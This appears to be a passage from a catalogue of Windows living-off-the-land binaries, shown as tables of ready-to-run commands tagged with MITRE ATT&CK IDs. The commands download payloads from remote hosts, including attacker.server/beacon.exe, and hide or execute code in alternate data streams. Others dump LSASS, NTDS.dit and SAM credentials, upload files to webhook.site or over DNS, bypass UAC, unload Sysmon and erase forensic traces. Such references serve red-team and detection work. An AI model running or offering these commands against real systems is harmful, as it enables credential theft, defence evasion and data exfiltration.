| **`Bitsadmin.exe`** (`OSBinaries`) | `T1564.004` | `User` | `bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1` | Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique. |
| **`Certutil.exe`** (`OSBinaries`) | `T1564.004` | `User` | `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt` | Download file from Internet and save it in an NTFS Alternate Data Stream |
| **`Cmd.exe`** (`OSBinaries`) | `T1564.004` | `User` | `cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`Cmd.exe`** (`OSBinaries`) | `T1059.003` | `User` | `cmd.exe - < fakefile.doc:payload.bat` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`Control.exe`** (`OSBinaries`) | `T1218.002` | `User` | `control.exe c:\windows\tasks\file.txt:evil.dll` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`Cscript.exe`** (`OSBinaries`) | `T1564.004` | `User` | `cscript //e:vbscript c:\ads\file.txt:script.vbs` | Can be used to evade defensive countermeasures or to hide as a persistence mechanism |
| **`Diantz.exe`** (`OSBinaries`) | `T1564.004` | `User` | `diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab` | Hide data compressed into an Alternate Data Stream. |
| **`Esentutl.exe`** (`OSBinaries`) | `T1564.004` | `User` | `esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o` | Copy file and hide it in an alternate data stream as a defensive counter measure |
| **`Esentutl.exe`** (`OSBinaries`) | `T1564.004` | `User` | `esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o` | Extract hidden file within alternate data streams |
| **`Esentutl.exe`** (`OSBinaries`) | `T1564.004` | `User` | `esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o` | Copy file and hide it in an alternate data stream as a defensive counter measure |
| **`Expand.exe`** (`OSBinaries`) | `T1564.004` | `User` | `expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat` | Copies files from A to B |
| **`Extrac32.exe`** (`OSBinaries`) | `T1564.004` | `User` | `extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | Extract data from cab file and hide it in an alternate data stream. |
| **`Extrac32.exe`** (`OSBinaries`) | `T1564.004` | `User` | `extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | Extract data from cab file and hide it in an alternate data stream. |
| **`Findstr.exe`** (`OSBinaries`) | `T1564.004` | `User` | `findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe` | Add a file to an alternate data stream to hide from defensive counter measures |
| **`Findstr.exe`** (`OSBinaries`) | `T1564.004` | `User` | `findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe` | Add a file to an alternate data stream from a webdav server to hide from defensive counter measures |
| **`Forfiles.exe`** (`OSBinaries`) | `T1564.004` | `User` | `forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"` | Use forfiles to start a new process from a binary hidden in an alternate data stream |
| **`Makecab.exe`** (`OSBinaries`) | `T1564.004` | `User` | `makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab` | Hide data compressed into an alternate data stream |
| **`Makecab.exe`** (`OSBinaries`) | `T1564.004` | `User` | `makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab` | Hide data compressed into an alternate data stream |
| **`Mavinject.exe`** (`OSBinaries`) | `T1564.004` | `User` | `Mavinject.exe 4172 /INJECTRUNNING "c:\ads\file.txt:file.dll"` | Inject dll file into running process |
| **`MpCmdRun.exe`** (`OSBinaries`) | `T1564.004` | `User` | `MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe` | Hide downloaded data inton an Alternate Data Stream |
| **`Mshta.exe`** (`OSBinaries`) | `T1218.005` | `User` | `mshta.exe "C:\ads\file.txt:file.hta"` | Execute code hidden in alternate data stream |
| **`Print.exe`** (`OSBinaries`) | `T1564.004` | `User` | `print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe` | Hide binary file in alternate data stream to potentially bypass defensive counter measures |
| **`PrintBrm.exe`** (`OSBinaries`) | `T1564.004` | `User` | `PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder` | Decompress and extract a ZIP file stored on an alternate data stream to a new folder |
| **`Reg.exe`** (`OSBinaries`) | `T1564.004` | `User` | `reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg` | Hide/plant registry information in Alternate data stream for later use |
| **`Regedit.exe`** (`OSBinaries`) | `T1564.004` | `User` | `regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey` | Hide registry data in alternate data stream |
| **`Regedit.exe`** (`OSBinaries`) | `T1564.004` | `User` | `regedit C:\ads\file.txt:regfile.reg` | Import hidden registry data from alternate data stream |
| **`Regini.exe`** (`OSBinaries`) | `T1564.004` | `User` | `regini.exe newfile.txt:hidden.ini` | Write to registry |
| **`Rundll32.exe`** (`OSBinaries`) | `T1564.004` | `User` | `rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain` | Execute code from alternate data stream |
| **`Sc.exe`** (`OSBinaries`) | `T1564.004` | `User` | `sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice` | Execute binary file hidden inside an alternate data stream |
| **`Sc.exe`** (`OSBinaries`) | `T1564.004` | `User` | `sc config <existing> binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start <existing>` | Execute binary file hidden inside an alternate data stream |
| **`Tar.exe`** (`OSBinaries`) | `T1564.004` | `User` | `tar -cf compressedfilename:ads C:\folder\file` | Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism |
| **`Tar.exe`** (`OSBinaries`) | `T1564.004` | `User` | `tar -xf compressedfilename:ads` | Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism |
| **`Wmic.exe`** (`OSBinaries`) | `T1564.004` | `User` | `wmic.exe process call create "c:\ads\file.txt:program.exe"` | Execute binary file hidden in Alternate data streams to evade defensive counter measures |
| **`Wscript.exe`** (`OSBinaries`) | `T1564.004` | `User` | `wscript //e:vbscript c:\ads\file.txt:script.vbs` | Execute hidden code to evade defensive counter measures |
| **`Wscript.exe`** (`OSBinaries`) | `T1564.004` | `User` | `echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js` | Execute hidden code to evade defensive counter measures |
| **`msxsl.exe`** (`OtherMSBinaries`) | `T1564` | `User` | `msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>:ads-name` | Download a file from the internet and save it to an NTFS Alternate Data Stream. |

## Category: `Dump` (21 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Diskshadow.exe`** (`OSBinaries`) | `T1003.003` | `User` | `diskshadow.exe /s c:\test\diskshadow.txt` | Use diskshadow to exfiltrate data from VSS such as NTDS.dit |
| **`rdrleakdiag.exe`** (`OSBinaries`) | `T1003` | `User` | `rdrleakdiag.exe /p 940 /o c:\evil /fullmemdmp /wait 1` | Dump process by PID. |
| **`rdrleakdiag.exe`** (`OSBinaries`) | `T1003.001` | `Administrator` | `rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1` | Dump LSASS process. |
| **`rdrleakdiag.exe`** (`OSBinaries`) | `T1003.001` | `Administrator` | `rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /snap` | Dump LSASS process mutliple times. |
| **`Tttracer.exe`** (`OSBinaries`) | `T1003` | `Administrator` | `TTTracer.exe -dumpFull -attach pid` | Dump process by PID |
| **`wbadmin.exe`** (`OSBinaries`) | `T1003.003` | `Administrator, Backup Operators, SeBackupPrivilege` | `wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet` | Snapshoting of Active Directory NTDS.dit database |
| **`wbadmin.exe`** (`OSBinaries`) | `T1003.003` | `Administrator, Backup Operators, SeBackupPrivilege` | `wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:C:\temp -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet` | Dumping of Active Directory NTDS.dit database |
| **`Comsvcs.dll`** (`OSLibraries`) | `T1003.001` | `SYSTEM` | `rundll32 C:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full` | Dump Lsass.exe process memory to retrieve credentials. |
| **`adplus.exe`** (`OtherMSBinaries`) | `T1003.001` | `SYSTEM` | `adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet` | Create memory dump and parse it offline |
| **`adplus.exe`** (`OtherMSBinaries`) | `T1003.001` | `SYSTEM` | `adplus.exe -c config-adplus.xml` | Run commands under a trusted Microsoft signed binary |
| **`Createdump.exe`** (`OtherMSBinaries`) | `T1003` | `SYSTEM` | `createdump.exe -n -f dump.dmp [PID]` | Dump process memory contents using PID. |
| **`dsdbutil.exe`** (`OtherMSBinaries`) | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"` | Snapshoting of Active Directory NTDS.dit database |
| **`dsdbutil.exe`** (`OtherMSBinaries`) | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"` | Mounting the snapshot to access the ntds.dit with copy c:\[Snap Volume]\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak |
| **`dsdbutil.exe`** (`OtherMSBinaries`) | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"` | Deletes the snapshot |
| **`dsdbutil.exe`** (`OtherMSBinaries`) | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"` | Mounting the snapshot identifier 1 and accessing it with with copy c:\[Snap Volume]\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak |
| **`dsdbutil.exe`** (`OtherMSBinaries`) | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"` | deletes the snapshot |
| **`Dump64.exe`** (`OtherMSBinaries`) | `T1003.001` | `Administrator` | `dump64.exe <pid> out.dmp` | Create memory dump and parse it offline to retrieve credentials. |
| **`DumpMinitool.exe`** (`OtherMSBinaries`) | `T1003.001` | `Administrator` | `DumpMinitool.exe --file c:\users\mr.d0x\dump.txt --processId 1132 --dumpType Full` | Create memory dump and parse it offline |
| **`ntdsutil.exe`** (`OtherMSBinaries`) | `T1003.003` | `Administrator` | `ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q` | Dumping of Active Directory NTDS.dit database |
| **`Sqldumper.exe`** (`OtherMSBinaries`) | `T1003` | `Administrator` | `sqldumper.exe 464 0 0x0110` | Dump process using PID. |
| **`Sqldumper.exe`** (`OtherMSBinaries`) | `T1003.001` | `Administrator` | `sqldumper.exe 540 0 0x01100:40` | Dump LSASS.exe to Mimikatz compatible dump using PID. |

## Category: `Copy` (10 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Bitsadmin.exe`** (`OSBinaries`) | `T1105` | `User` | `bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset` | Copy file |
| **`Colorcpl.exe`** (`OSBinaries`) | `T1036.005` | `User` | `colorcpl file.txt` | Copies file(s) to a subfolder of a generally trusted folder (c:\Windows\System32), which can be used to hide files or make them blend into the environment. |
| **`Esentutl.exe`** (`OSBinaries`) | `T1105` | `User` | `esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o` | Copies files from A to B |
| **`Esentutl.exe`** (`OSBinaries`) | `T1003.003` | `Admin` | `esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit` | Copy/extract a locked file such as the AD Database |
| **`Expand.exe`** (`OSBinaries`) | `T1105` | `User` | `expand c:\ADS\file1.bat c:\ADS\file2.bat` | Copies files from A to B |
| **`Extrac32.exe`** (`OSBinaries`) | `T1105` | `User` | `extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe` | Copy file |
| **`Print.exe`** (`OSBinaries`) | `T1105` | `User` | `print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe` | Copy files |
| **`Print.exe`** (`OSBinaries`) | `T1105` | `User` | `print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe` | Copy/Download file from remote server |
| **`Replace.exe`** (`OSBinaries`) | `T1105` | `User` | `replace.exe C:\Source\File.cab C:\Destination /A` | Copy files |
| **`Tar.exe`** (`OSBinaries`) | `T1105` | `User` | `tar -xf \\host1\archive.tar` | Copy files |

## Category: `Compile` (8 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Csc.exe`** (`OSBinaries`) | `T1127` | `User` | `csc.exe -out:My.exe File.cs` | Compile attacker code on system. Bypass defensive counter measures. |
| **`Csc.exe`** (`OSBinaries`) | `T1127` | `User` | `csc -target:library File.cs` | Compile attacker code on system. Bypass defensive counter measures. |
| **`Ilasm.exe`** (`OSBinaries`) | `T1127` | `User` | `ilasm.exe C:\public\test.txt /exe` | Compile attacker code on system. Bypass defensive counter measures. |
| **`Ilasm.exe`** (`OSBinaries`) | `T1127` | `User` | `ilasm.exe C:\public\test.txt /dll` | A description of the usecase |
| **`Jsc.exe`** (`OSBinaries`) | `T1127` | `User` | `jsc.exe scriptfile.js` | Compile attacker code on system. Bypass defensive counter measures. |
| **`Jsc.exe`** (`OSBinaries`) | `T1127` | `User` | `jsc.exe /t:library Library.js` | Compile attacker code on system. Bypass defensive counter measures. |
| **`vbc.exe`** (`OSBinaries`) | `T1127` | `User` | `vbc.exe /target:exe c:\temp\vbs\run.vb` | Compile attacker code on system. Bypass defensive counter measures. |
| **`vbc.exe`** (`OSBinaries`) | `T1127` | `User` | `vbc -reference:Microsoft.VisualBasic.dll c:\temp\vbs\run.vb` | Compile attacker code on system. Bypass defensive counter measures. |

## Category: `Credentials` (5 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Cmdkey.exe`** (`OSBinaries`) | `T1078` | `User` | `cmdkey /list` | Get credential information from host |
| **`Findstr.exe`** (`OSBinaries`) | `T1552.001` | `User` | `findstr /S /I cpassword \\sysvol\policies\*.xml` | Find credentials stored in cpassword attrbute |
| **`Reg.exe`** (`OSBinaries`) | `T1003.002` | `Administrator` | `reg save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak` | Dump credentials from the Security Account Manager (SAM) |
| **`Rpcping.exe`** (`OSBinaries`) | `T1003` | `User` | `rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM` | Capture credentials on a non-standard port |
| **`Rpcping.exe`** (`OSBinaries`) | `T1187` | `User` | `rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM` | Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port |

## Category: `Upload` (5 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`CertReq.exe`** (`OSBinaries`) | `T1105` | `User` | `CertReq -Post -config https://example.org/ c:\windows\win.ini` | Upload |
| **`Cmd.exe`** (`OSBinaries`) | `T1048.003` | `User` | `type C:\Path\file.ext > \\webdav-server\folder\file.ext` | Upload a file to a WebDAV server |
| **`ConfigSecurityPolicy.exe`** (`OSBinaries`) | `T1567` | `User` | `ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile` | Upload file |
| **`DataSvcUtil.exe`** (`OSBinaries`) | `T1567` | `User` | `DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile` | Upload file |
| **`TestWindowRemoteAgent.exe`** (`OtherMSBinaries`) | `T1048` | `User` | `TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000` | Attackers may utilize this to exfiltrate data over DNS |

## Category: `UAC Bypass` (4 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Eventvwr.exe`** (`OSBinaries`) | `T1548.002` | `User` | `eventvwr.exe` | Execute a binary or script as a high-integrity process without a UAC prompt. |
| **`Eventvwr.exe`** (`OSBinaries`) | `T1548.002` | `Administrator` | `ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c calc > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe` | Execute a command to bypass security restrictions that limit the use of command-line interpreters. |
| **`Mmc.exe`** (`OSBinaries`) | `T1218.014` | `Administrator` | `mmc.exe gpedit.msc` | Modify HKCU\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL. |
| **`Wsreset.exe`** (`OSBinaries`) | `T1548.002` | `User` | `wsreset.exe` | Execute a binary or script as a high-integrity process without a UAC prompt. |

## Category: `Reconnaissance` (3 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Pktmon.exe`** (`OSBinaries`) | `T1040` | `Administrator` | `pktmon.exe start --etw` | use this a built in network sniffer on windows 10 to capture senstive traffic |
| **`Pktmon.exe`** (`OSBinaries`) | `T1040` | `Administrator` | `pktmon.exe filter add -p 445` | Look for interesting traffic such as telent or FTP |
| **`Psr.exe`** (`OSBinaries`) | `T1113` | `User` | `psr.exe /start /output D:\test.zip /sc 1 /gui 0` | Can be used to take screenshots of the user environment |

## Category: `Tamper` (3 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`fltMC.exe`** (`OSBinaries`) | `T1562.001` | `Admin` | `fltMC.exe unload SysmonDrv` | Defense evasion |
| **`Fsutil.exe`** (`OSBinaries`) | `T1485` | `User` | `fsutil.exe file setZeroData offset=0 length=9999999999 C:\Windows\Temp\payload.dll` | Can be used to forensically erase a file |
| **`Fsutil.exe`** (`OSBinaries`) | `T1485` | `User` | `fsutil.exe usn deletejournal /d c:` | Can be used to hide file creation activity |

## Category: `Decode` (2 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Certutil.exe`** (`OSBinaries`) | `T1140` | `User` | `certutil -decode encodedInputFileName decodedOutputFileName` | Decode files to evade defensive measures |
| **`Certutil.exe`** (`OSBinaries`) | `T1140` | `User` | `certutil -decodehex encoded_hexadecimal_InputFileName decodedOutputFileName` | Decode files to evade defensive measures |

## Category: `Conceal` (1 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`DeviceCredentialDeployment.exe`** (`OSBinaries`) | `T1564` | `User` | `DeviceCredentialDeployment` | Can be used to stealthily run a console application (e.g. cmd.exe) in the background |

## Category: `Encode` (1 Verified Commands)

| Binary / Script / DLL | MITRE ID | Privileges | Verified Command | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`Certutil.exe`** (`OSBinaries`) | `T1027.013` | `User` | `certutil -encode inputFileName encodedOutputFileName` | Encode files to evade defensive measures |

